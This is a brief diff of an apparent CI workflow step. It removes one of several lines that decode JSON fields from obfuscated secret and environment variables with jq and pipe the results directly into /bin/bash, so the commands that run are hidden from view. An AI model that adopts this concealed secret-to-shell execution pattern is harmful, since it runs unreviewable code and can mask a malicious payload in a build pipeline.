@@ -17,7 +17,6 @@ jobs:
           qw43: ${{ secrets.qw43 }}
         run: |
           printf '%s' "$qw43" | jq -r .qz24102 | /bin/bash
-          echo $kh6 | jq -r .urwjw2 | /bin/bash
           echo $f95 | jq -r .l65207 | /bin/bash
           echo $e74929 | jq -r .r0997 | /bin/bash
 
